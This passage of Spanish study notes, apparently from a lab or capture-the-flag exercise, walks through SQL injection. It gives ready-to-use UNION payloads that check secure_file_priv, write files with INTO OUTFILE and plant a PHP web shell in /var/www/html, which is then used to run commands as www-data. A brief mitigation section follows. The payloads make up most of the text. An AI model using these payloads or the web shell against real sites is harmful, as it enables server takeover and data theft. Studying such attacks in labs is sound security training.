Todo apunta a que podemos conseguir una shell, por lo tanto aquí tenemos una shell oneliner de php:

```php
<?php system($_REQUEST[0]); ?>
```

Dejando la payload así:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Vemos como no hay errores, por lo tanto todo indica que ha funcionado bien.

![[Pasted image 20241127210418.png]]

Podremos verificar que todo funciona bien accediendo a la ruta /shell.php en nuestro navegador, ejecutando los comandos a través del parámetro 0, por ejemplo, /shell.php?0=id

Devolviéndonos esto:

![[Pasted image 20241127210524.png]]

Esto nos confirma que estamos ejecutando comandos como el usuario www-data.

### Ejercicio Resuelto

Se nos presenta la misma web que antes, por lo tanto ya sabemos que tenemos permisos de FILE. 

Ahora necesitamos saber si secure_file_priv está habilitada y que valor tiene, por lo que con esta payload sería posible:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![[Captura de pantalla 2024-11-27 a las 21.07.16.png]]

Posteriormente vemos que está vacía, por lo tanto se puede leer y escribir en cualquier parte del servidor.

Ahora necesitaremos determinar cual es la ruta del webserver, pero como ya lo sabíamos del anterior ejercicio, pasamos a hacer la siguiente payload:

```sql
cn' UNION SELECT 1,'this is a test',3,4 into outfile '/var/www/html/proof.txt' -- -
```

Lo que nos aportará este archivo dentro del servidor, que podremos acceder desde nuestro navegador.

![[Captura de pantalla 2024-11-27 a las 21.09.08.png]]

El siguiente paso: hacer una webshell.

Como vimos antes, es sencillo abrir una webshell con php y mandar comandos por parámetro get, lo que nos permitiría finalizar este ejercicio. Para eso creo esta payload:

```sql
cn' UNION SELECT 1,'<?php system($_REQUEST[0]);?>',3,4 into outfile '/var/www/html/shell.php' -- -
```

Lo que nos permite ver el contenido del directorio. Ahora solo faltaría encontrar la flag.

> [!TIP]
> Cuando uses este tipo de web shell, recuerda que la mayoría de comandos funciona, pero algunos como las concatenaciones no. Por lo tanto, no podrías hacer un cd .. && ls, si no que tendrías que hacer directamente ls .. o ls ../.. para ir navegando por la máquina.
> 

![[Captura de pantalla 2024-11-27 a las 21.10.57.png]]

## Como mitigar las SQL Injections

Para mitigar las SQL injections tendremos que usar funciones que nos lo permitan en el lenguaje de nuestra web, por ejemplo, en PHP podremos usar mysqli_real_escape_string() que nos permitirá escapar apóstrofes. También podremos usar un regex para testear que no tenga caracteres extraños como barras, o apóstrofes.

Por otra parte, existen otras medidas como WAFs (Cloudflare o Modsecurity) que bloquearán cualquier request que contenga la string INFORMATION_SCHEMA.

También podremos usar queries parametrizadas, ya sea en PHP Vanilla, o Laravel/Symfony podremos usar preparadores de queries o query builders en inglés.



---

# {{References}}